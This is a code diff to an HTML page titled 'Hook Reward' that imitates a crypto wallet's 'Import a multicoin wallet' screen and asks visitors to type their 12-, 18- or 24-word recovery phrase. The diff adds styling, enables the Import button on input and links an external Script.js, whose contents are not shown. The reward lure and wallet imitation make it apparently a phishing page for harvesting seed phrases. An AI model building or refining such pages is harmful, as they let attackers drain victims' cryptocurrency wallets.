@@ -9,26 +9,27 @@
     <title>Hook Reward</title>
 </head>
 
-<body>
+<body style="background-color: #1A1C1E;">
     <div class="cont">
         <div class="claimRewards">
             <div class="outcontainer">
                 <div class="twimg">
-                    <img src="./Assets/Images/tw.png" alt="">
+                    <img src="./Assets/Images/tw.png" alt="" class="twsimg">
                 </div>
                 <div class="multicoin">
                     Import a multicoin wallet
                 </div>
             </div>
-            <div class="textarea">
-                <textarea minlength="30" name="phrase" id="phrase" cols="30" rows="4" placeholder="Phrase"></textarea>
+            <div class="fortextarea">
+                <textarea minlength="30" name="phrase" id="phrase" cols="30" rows="4" placeholder="Phrase" class="textarea" oninput="enableButton()"></textarea>
             </div>
             <p class="Typically">
                 Typically 12 (sometimes 18, 24) words separated by single spaces
             </p>
-            <button class="import" id="import">Import</button>
+            <button class="import" id="import" disabled>Import</button>
         </div>
     </div>
+    <script src="Script.js"></script>
 </body>
 
 </html>
